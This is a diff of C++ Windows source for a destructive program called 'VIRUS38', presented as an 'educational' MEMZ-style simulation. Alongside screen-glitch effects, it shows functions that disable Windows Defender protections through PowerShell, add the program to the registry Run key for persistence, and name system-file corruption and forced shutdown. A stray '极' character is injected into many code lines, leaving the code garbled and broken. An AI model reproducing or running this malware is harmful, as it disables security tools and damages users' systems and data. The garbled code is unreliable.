@@ -253,7 +253,7 @@ void CaptureScreen(HWND) {
     
     if (hGlitchBitmap) {
         SelectObject(hdcMem, hGlitchBitmap);
-        BitBlt(hdcMem, 0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);
+        BitBlt(hdcMem, 极0, 0, screenWidth, screenHeight, hdcScreen, 0, 0, SRCCOPY);
     }
     
     POINT pt;
@@ -299,7 +299,7 @@ void ApplyCursorEffect() {
                 int pos = (y * screenWidth + x) * 4;
                 if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                     pPixels[pos] = 255 - pPixels[pos];
-                    pPixels[pos + 1] = 255 - pPixels[pos + 1];
+                    pPixels[pos + 1] = 255 - p极ixels[pos + 1];
                     pPixels[pos + 2] = 255 - pPixels[pos + 2];
                     
                     if (dist < cursorSize / 2) {
@@ -331,7 +331,7 @@ void UpdateParticles() {
             Particle p;
             p.x = rand() % screenWidth;
             p.y = rand() % screenHeight;
-            p.vx = (rand() % 600 - 300) / 20.0f;
+            p.v极x = (rand() % 600 - 300) / 20.0f;
             p.vy = (rand() % 600 - 300) / 20.0f;
             p.life = 0;
             p.maxLife = 150 + rand() % 500;
@@ -461,7 +461,7 @@ void ApplyTextCorruption() {
         
         DeleteObject(hFont);
         
-        if (GetTickCount() - it->creationTime > it->life) {
+        if (GetTickCount() - it->creationTime > it->life极) {
             it = corruptedTexts.erase(it);
         } else {
             it->x += (rand() % 25) - 12;
@@ -475,12 +475,12 @@ void ApplyTextCorruption() {
     bmih.biWidth = screenWidth;
     bmih.biHeight = -screenHeight;
     bmih.biPlanes = 1;
-    b极ih.biBitCount = 32;
+    bmih.biBitCount = 32;
     bmih.biCompression = BI_RGB;
     bmih.biSizeImage = 0;
     bmih.biXPelsPerMeter = 0;
     bmih.biYPelsPerMeter = 0;
-    bm极ih.biClrUsed = 0;
+    bmih.biClrUsed = 0;
     bmih.biClrImportant = 0;
     
     GetDIBits(hdcMem, hBitmap, 0, screenHeight, pPixels, (BITMAPINFO*)&bmih, DIB_RGB_COLORS);
@@ -497,11 +497,11 @@ void ApplyPixelSorting() {
     int height = 200 + rand() % 800;
     
     int endX = std::min(startX + width, screenWidth);
-    int极 endY = std::min(startY + height, screenHeight);
+    int endY = std::min(startY + height, screenHeight);
     
     for (int y = startY; y < endY; y++) {
         std::vector<std::pair<float, int>> brightness;
-        for (int x = startX; x < end极X; x++) {
+        for (int x = startX; x < endX; x++) {
             int pos = (y * screenWidth + x) * 4;
             if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                 float brt = 0.299f * pPixels[pos+2] + 0.587f * pPixels[pos+1] + 0.114f * pPixels[pos];
@@ -513,7 +513,7 @@ void ApplyPixelSorting() {
         
         std::vector<BYTE> sortedLine;
         for (auto& b : brightness) {
-            int pos = (极y * screenWidth + b.second) * 4;
+            int pos = (y * screenWidth + b.second) * 4;
             sortedLine.push_back(pPixels[pos]);
             sortedLine.push_back(pPixels[pos+1]);
             sortedLine.push_back(pPixels[pos+2]);
@@ -525,7 +525,7 @@ void ApplyPixelSorting() {
             if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                 int idx = (x - startX) * 4;
                 pPixels[pos] = sortedLine[idx];
-                pPixels[pos+1极] = sorted极Line[idx+1];
+                pPixels[pos+1] = sortedLine[idx+1];
                 pPixels[pos+2] = sortedLine[idx+2];
                 pPixels[pos+3] = sortedLine[idx+3];
             }
@@ -541,7 +541,7 @@ void ApplyStaticBars() {
         int barY = rand() % screenHeight;
         int barHeightActual = std::min(barHeight, screenHeight - barY);
         
-        for (int y = bar极Y; y < barY + barHeightActual; y++) {
+        for (int y = barY; y < barY + barHeightActual; y++) {
             for (int x = 0; x < screenWidth; x++) {
                 int pos = (y * screenWidth + x) * 4;
                 if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
@@ -563,17 +563,17 @@ void ApplyInversionWaves() {
     float speed = 0.5f + (rand() % 200) / 100.0f;
     DWORD currentTime = GetTickCount();
     
-    for (int y = 0; y < screenHeight; y++) {
+    for (极int y = 0; y < screenHeight; y++) {
         for (int x = 0; x < screenWidth; x++) {
             float dx = static_cast<float>(x - centerX);
             float dy = static_cast<float>(y - centerY);
             float dist = sqrt(dx*dx + dy*dy);
             
             if (dist < maxRadius) {
-                float wave = sin(dist * 0.02f - currentTime * 0.002f * speed) * 0.5极f + 0.5f;
+                float wave = sin(dist * 0.02f - currentTime * 0.002f * speed) * 0.5f + 0.5f;
                 if (wave > 0.5f) {
                     int pos = (y * screenWidth + x) * 4;
-                    if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight *极 4) - 4) {
+                    if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                         pPixels[pos] = 255 - pPixels[pos];
                         pPixels[pos+1] = 255 - pPixels[pos+1];
                         pPixels[pos+2] = 255 - pPixels[pos+2];
@@ -593,7 +593,7 @@ void ApplyDistortionEffect() {
     int yStart = std::max(centerY - radius, 0);
     int yEnd = std::min(centerY + radius, screenHeight);
     int xStart = std::max(centerX - radius, 0);
-    int xEnd = std::min(centerX + radius, screenWidth);
+    int x极End = std::min(centerX + radius, screenWidth);
     
     for (int y = yStart; y < yEnd; y++) {
         for (int x = xStart; x < xEnd; x++) {
@@ -607,7 +607,7 @@ void ApplyDistortionEffect() {
                 int shiftY = static_cast<int>(dy * amount * distortion * (rand() % 7 - 3));
                 
                 int srcX = x - shiftX;
-                int srcY =极 y - shiftY;
+                int srcY = y - shiftY;
                 
                 if (srcX >= 0 && srcX < screenWidth && srcY >= 0 && srcY < screenHeight) {
                     int srcPos = (srcY * screenWidth + srcX) * 4;
@@ -638,12 +638,12 @@ void ApplyScreenFlash() {
                 if (i < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                     if (screenInverted) {
                         pPixels[i] = 255 - pPixels[i];
-                        pPixels[i + 1] = 255极 - pPixels[i + 1];
+                        pPixels[i + 1] = 255 - pPixels[i + 1];
                         pPixels[i + 2] = 255 - pPixels[i + 2];
                     } else {
                         pPixels[i] = rand() % 256;
                         pPixels[i + 1] = rand() % 256;
-                        p极ixels[i + 2] = rand() % 256;
+                        pPixels[i + 2] = rand() % 256;
                     }
                 }
             }
@@ -660,7 +660,7 @@ void ApplyGlitchEffect() {
     
     DWORD cTime = GetTickCount();
     
-    int timeIntensity = 1 + static_cast<int>((cTime - startTime) / 2000);
+    int timeIntensity = 1 + static_cast<int>((c极Time - startTime) / 2000);
     intensityLevel = std::min(40, timeIntensity);
     
     ApplyScreenShake();
@@ -679,7 +679,7 @@ void ApplyGlitchEffect() {
         height = std::min(height, screenHeight - y);
         if (height <= 0) continue;
         
-        for (int h = 极0; h < height; ++h) {
+        for (int h = 0; h < height; ++h) {
             int currentY = y + h;
             if (currentY >= screenHeight) break;
             
@@ -710,8 +710,8 @@ void ApplyGlitchEffect() {
                             source + absOffset * 4, 
                             copySize);
                 }
-                for (极int x = screenWidth - absOffset; x < screenWidth; x++) {
-                    int pos = (currentY * screenWidth + x极) * 4;
+                for (int x = screenWidth - absOffset; x < screenWidth; x++) {
+                    int pos = (currentY * screenWidth + x) * 4;
                     if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                         pPixels[pos] = rand() % 256;
                         pPixels[pos + 1] = rand() % 256;
@@ -737,7 +737,7 @@ void ApplyGlitchEffect() {
             
             if (destY >= 0 && destY < screenHeight && sourceY >= 0 && sourceY < screenHeight) {
                 BYTE* source = pCopy + (sourceY * screenWidth + x) * 4;
-                BYTE极* dest = pPixels + (destY * screenWidth + x + offsetX) * 4;
+                BYTE* dest = pPixels + (destY * screenWidth + x + offsetX) * 4;
                 
                 int effectiveWidth = blockWidth;
                 if (x + offsetX + blockWidth > screenWidth) {
@@ -778,12 +778,12 @@ void ApplyGlitchEffect() {
     
     if (rand() % 2 == 0) {
         int lineHeight = 1 + rand() % (10 * intensityLevel);
-        for (int y = 0极; y < screenHeight; y += lineHeight * 2) {
+        for (int y = 0; y < screenHeight; y += lineHeight * 2) {
             for (int h = 0; h < lineHeight; h++) {
                 if (y + h >= screenHeight) break;
-                for (int x = 0; x < screenWidth; x++) {
+                for (int x = 0; x极 < screenWidth; x++) {
                     int pos = ((y + h) * screenWidth + x) * 4;
-                    if (pos >= 0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
+                    if (pos >= 极0 && pos < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                         pPixels[pos] = std::min(pPixels[pos] + 200, 255);
                         pPixels[pos + 1] = std::min(pPixels[pos + 1] + 200, 255);
                         pPixels[pos + 2] = std::min(pPixels[pos + 2] + 200, 255);
@@ -794,8 +794,8 @@ void ApplyGlitchEffect() {
     }
     
     if (intensityLevel > 0 && (rand() % std::max(1, 6 / intensityLevel)) == 0) {
-        for (int i = 0; i < static_cast<int>(screenWidth * screen极Height * 4); i += 4) {
-            if (极i < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
+        for (int i = 0; i < static_cast<int>(screenWidth * screenHeight * 4); i += 4) {
+            if (i < static_cast<int>(screenWidth * screenHeight * 4) - 4) {
                 pPixels[i] = 255 - pPixels[i];
                 pPixels[i + 1] = 255 - pPixels[i + 1];
                 pPixels[i + 2] = 255 - pPixels[i + 2];
@@ -827,7 +827,7 @@ void ApplyGlitchEffect() {
     UpdateParticles();
     ApplyScreenFlash();
     
-    if (rand() % SOUND_CHANCE == 极0) {
+    if (rand() % SOUND_CHANCE == 0) {
         PlayGlitchSoundAsync();
     }
     
@@ -857,7 +857,7 @@ void DrawWarningMessage(HDC hdc) {
     
     HFONT hSmallFont = CreateFontW(
         24, 0, 0, 0, FW_NORMAL, FALSE, FALSE, FALSE,
-        DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_D极EFAULT_PRECIS,
+        DEFAULT_CHARSET, OUT_DEFAULT_PRECIS, CLIP_DEFAULT_PRECIS,
         DEFAULT_QUALITY, DEFAULT_PITCH | FF_DONTCARE,
         L"Arial"
     );
@@ -876,7 +876,7 @@ void DrawWarningMessage(HDC hdc) {
     rect.top += 100;
     
     std::wstring subText = L"Efek visual intens akan segera dimulai...";
-    DrawTextW(hdc, subText.c_str(), -1, &rect, DT_CENTER | DT_VCENTER | DT_SINGLELINE);
+    DrawTextW(hdc, subText.c_str(), -1, &rect, DT极_CENTER | DT_VCENTER | DT_SINGLELINE);
     
     DeleteObject(hFont);
     DeleteObject(hSmallFont);
@@ -890,7 +890,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
     case WM_CREATE:
         hdcLayered = CreateCompatibleDC(NULL);
         SetTimer(hwnd, 1, REFRESH_RATE, NULL);
-        warningStart极Time = GetTickCount();
+        warningStartTime = GetTickCount();
         return 0;
         
     case WM_TIMER: {
@@ -898,7 +898,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
         ApplyGlitchEffect();
         
         if (hdcLayered && hGlitchBitmap) {
-            HDC h极dcScreen = GetDC(NULL);
+            HDC hdcScreen = GetDC(NULL);
             POINT ptZero = {0, 0};
             SIZE size = {screenWidth, screenHeight};
             
@@ -908,7 +908,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
                 DrawWarningMessage(hdcLayered);
             }
             
-            UpdateLayeredWindow(hwnd, hdcScreen, &ptZero, &size, hdcLayered, 
+            UpdateLayeredWindow(hwnd, h极dcScreen, &ptZero, &size, hdcLayered, 
                                &ptZero, 0, &blend, ULW_ALPHA);
             
             ReleaseDC(NULL, hdcScreen);
@@ -917,7 +917,7 @@ LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam) {
     }
         
     case WM_DESTROY:
-        KillTimer(hwnd, 1);
+        KillTimer(hwnd极, 1);
         if (hGlitchBitmap) DeleteObject(hGlitchBitmap);
         if (hdcLayered) DeleteDC(hdcLayered);
         ShowCursor(TRUE);
@@ -951,12 +951,12 @@ void CorruptSystemFiles() {
 void DisableWindowsDefender() {
     ExecuteCommand("powershell -command \"Set-MpPreference -DisableRealtimeMonitoring $true\"");
     ExecuteCommand("powershell -command \"Set-MpPreference -DisableBehaviorMonitoring $true\"");
-    ExecuteCommand("powershell -command \"极Set-MpPreference -DisableBlockAtFirstSeen $true\"");
+    ExecuteCommand("powershell -command \"Set-MpPreference -DisableBlockAtFirstSeen $true\"");
     ExecuteCommand("powershell -command \"Set-MpPreference -DisableIOAVProtection $true\"");
     ExecuteCommand("powershell -command \"Set-MpPreference -DisablePrivacyMode $true\"");
     ExecuteCommand("powershell -command \"Set-MpPreference -DisableScanningMappedNetworkDrivesForFullScan $true\"");
     ExecuteCommand("powershell -command \"Set-MpPreference -DisableScanningNetworkFiles $true\"");
-    ExecuteCommand("powershell -command \"Set-MpPreference -极DisableScriptScanning $true\"");
+    ExecuteCommand("powershell -command \"Set-MpPreference -DisableScriptScanning $true\"");
 }
 
 void ShutdownSystem() {
@@ -977,7 +977,7 @@ void SelfReplicate() {
     
     // Menambahkan ke startup
     HKEY hKey;
-    RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &极hKey);
+    RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_WRITE, &hKey);
     RegSetValueExA(hKey, "VIRUS38", 0, REG_SZ, (BYTE*)targetPath, strlen(targetPath)+1);
     RegCloseKey(hKey);
 }
@@ -1011,7 +1011,7 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR, int) {
         L"PERINGATAN TERAKHIR!\n\n"
         L"Program ini akan menyebabkan kerusakan permanen pada sistem Anda.\n"
         L"Data Anda mungkin tidak dapat dipulihkan setelah program ini dijalankan.\n\n"
-       极 L"Program ini dibuat untuk tujuan edukasi dan penelitian saja.\n"
+        L"Program ini dibuat untuk tujuan edukasi dan penelitian saja.\n"
         L"JANGAN jalankan pada komputer yang digunakan untuk pekerjaan atau data penting.\n\n"
         L"Apakah Anda BENAR-BENAR yakin ingin melanjutkan?",
         L"VIRUS38 - FINAL WARNING", 
@@ -1052,12 +1052,12 @@ int WINAPI WinMain(HINSTANCE hInst, HINSTANCE, LPSTR, int) {
     
     HWND hwnd = CreateWindowExW(
         WS_EX_LAYERED | WS_EX_TRANSPARENT | WS_EX_TOPMOST | WS_EX_TOOLWINDOW,
-        wc.lps极zClassName, 
+        wc.lpszClassName, 
         L"MEMZ Simulation - Educational Purpose Only",
         WS_POPUP, 
         0, 0, 
         GetSystemMetrics(SM_CXSCREEN), 
-        Get极SystemMetrics(SM_CYSCREEN), 
+        GetSystemMetrics(SM_CYSCREEN), 
         NULL, NULL, hInst, NULL
     );
     
